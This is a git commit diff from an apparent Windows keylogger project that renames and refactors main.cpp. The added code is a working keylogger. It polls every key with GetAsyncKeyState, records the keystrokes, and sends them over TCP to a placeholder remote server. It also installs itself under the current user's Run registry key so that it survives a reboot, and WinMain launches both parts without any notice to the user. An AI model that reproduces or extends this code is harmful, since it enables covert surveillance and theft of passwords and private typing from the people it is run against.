8b9331f89b3f86deb5415d3a94629ac3f115e592
Arman <110356055+Winlogon-exe@users.noreply.github.com>
2024-01-10 23:15:49 +0300

    Update and rename main_client.cpp to main.cpp

--- main.cpp
+++ main.cpp
@@ -1,3 +1,6 @@
+#define KEY_STATE_PRESSED  0x8000 
+#define CAPS_LOCK_ON       0x0001  
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iostream>
@@ -10,25 +13,22 @@
 #include <unordered_map>
 #pragma comment(lib, "Ws2_32.lib")
 
-using namespace std;
-void sendDataToServer(const std::string& data);
-
 struct KeyboardSymbols
 {
-    static const vector<char>& getPrintableChars()
-     {
-        static const vector<char>printableChars =
-         {
-             'q','w','e','r','t','y','u','i','o','p',
-             'a','s','d','f','g','h','j','k','l',
-             'z','x','c','v','b','n','m',
-             'Q','W','E','R','T','Y','U','I','O','P',
-             'A','S','D','F','G','H','J','K','L',
-             'Z','X','C','V','B','N','M',
-             '1','2','3','4','5','6','7','8','9','0',
-         };
-         return printableChars;
-     }    
+    static const std::vector<char>& getPrintableChars()
+    {
+        static const std::vector<char>printableChars =
+        {
+            'q','w','e','r','t','y','u','i','o','p',
+            'a','s','d','f','g','h','j','k','l',
+            'z','x','c','v','b','n','m',
+            'Q','W','E','R','T','Y','U','I','O','P',
+            'A','S','D','F','G','H','J','K','L',
+            'Z','X','C','V','B','N','M',
+            '1','2','3','4','5','6','7','8','9','0',
+        };
+        return printableChars;
+    }
 
     static const std::unordered_map<int, std::string>& getVKchar()
     {
@@ -72,55 +72,16 @@ struct KeyboardSymbols
         {221, "]"},
         {219, "["},
         };
+
         return keyMap;
-    } 
+    }
 };
 
-void keylog(const vector<char>& printableChars) {
-    bool keyState[256] = { false };
-    std::string dataToSend;
-
-    const auto& keyMap = KeyboardSymbols::getVKchar(); //получаем карту клавиш один раз
-
-    while (true) {
-        bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-        bool useUpperCase = (isCapsLock && !isShiftPressed) || (!isCapsLock && isShiftPressed);
-
-        for (int i = 0; i < 256; i++) {
-            if ((GetAsyncKeyState(i) & 0x8000) && !keyState[i]) {
-                auto it = keyMap.find(i);
-                if (it != keyMap.end()) {
-                    dataToSend += it->second; //Используем значение из карты 
-                }
-                else if (isalpha(i)) {
-                    char c = useUpperCase ? toupper(i) : tolower(i);
-                    dataToSend += c;
-                }
-                else if (std::find(printableChars.begin(), printableChars.end(), char(i)) != printableChars.end()) {
-                    dataToSend += char(i);
-                }
-                dataToSend += '\n';
-                keyState[i] = true;
-            }
-            else if (!(GetAsyncKeyState(i) & 0x8000) && keyState[i]) {
-                keyState[i] = false;
-            }
-        }
-
-        if (!dataToSend.empty()) {
-            sendDataToServer(dataToSend);
-            dataToSend.clear();
-        }
-
-        Sleep(10); 
-    }
-}
-
-void sendDataToServer(const std::string& data) {
-    WSADATA wsaData;
-    SOCKET sock = INVALID_SOCKET;
+void sendDataToServer(const std::string& data)
+{
     struct addrinfo hints, * res;
+    WSADATA         wsaData;
+    SOCKET          sock = INVALID_SOCKET;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         std::cerr << "Winsock init failed" << std::endl;
@@ -132,7 +93,10 @@ void sendDataToServer(const std::string& data) {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    int status = getaddrinfo("your_ip_server", "your_port_server", &hints, &res);
+#define SERVER_IP "external_ip"
+#define SERVER_PORT "port"
+    int status = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res);
+
     if (status != 0) {
         std::cerr << "getaddrinfo failed: " << gai_strerror(status) << std::endl;
         WSACleanup();
@@ -165,25 +129,66 @@ void sendDataToServer(const std::string& data) {
     WSACleanup();
 }
 
+void keylog(const std::vector<char>& printableChars)
+{
+    const auto& keyMap = KeyboardSymbols::getVKchar(); 
+    bool keyState[256] = { false };
+    std::string dataToSend;
+    bool isCapsLock, isShiftPressed, useUpperCase;
+
+    while (true) {
+        isCapsLock = (GetKeyState(VK_CAPITAL) & CAPS_LOCK_ON) != 0;
+        isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & KEY_STATE_PRESSED) != 0;
+        useUpperCase = (isCapsLock && !isShiftPressed) || (!isCapsLock && isShiftPressed);
+
+        for (int i = 0; i < 256; i++) {
+            if ((GetAsyncKeyState(i) & KEY_STATE_PRESSED) && !keyState[i]) {
+                auto it = keyMap.find(i);
+
+                if (it != keyMap.end()) {
+                    dataToSend += it->second;
+                }
+                else if (isalpha(i)) {
+                    char c = useUpperCase ? toupper(i) : tolower(i);
+                    dataToSend += c;
+                }
+                else if (std::find(printableChars.begin(), printableChars.end(), char(i)) != printableChars.end()) {
+                    dataToSend += char(i);
+                }
+                dataToSend += '\n';
+                keyState[i] = true;
+            }
+            else if (!(GetAsyncKeyState(i) & KEY_STATE_PRESSED) && keyState[i]) {
+                keyState[i] = false;
+            }
+        }
+
+        if (!dataToSend.empty()) {
+            sendDataToServer(dataToSend);
+            dataToSend.clear();
+        }
+
+        Sleep(10);
+    }
+}
+
 void AutoRun()
 {
-    wchar_t arr[MAX_PATH] = L"D:\\Visual_Studio_PROJECTS\\keyLogger\\x64\\Release\\key.exe";
+#define KEYLOGGER_PATH L"D:\\Visual_Studio_PROJECTS\\keyLogger\\x64\\Release\\key.exe"
+#define REGISTRY_PATH L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
     HKEY hKey;
+    wchar_t arr[MAX_PATH] = KEYLOGGER_PATH;
+    if (RegCreateKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS){
 
-    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
-    {
-        //name - key
         if (RegSetValueEx(hKey, L"key", 0, REG_SZ, (BYTE*)arr, (wcslen(arr) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS)
-        {
             RegCloseKey(hKey);
-        }
     }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
 {
     AutoRun();
-    keylog(KeyboardSymbols::getPrintableChars());
+    keylog(KeyboardSymbols::getPrintableChars());  
     return 0;
 }
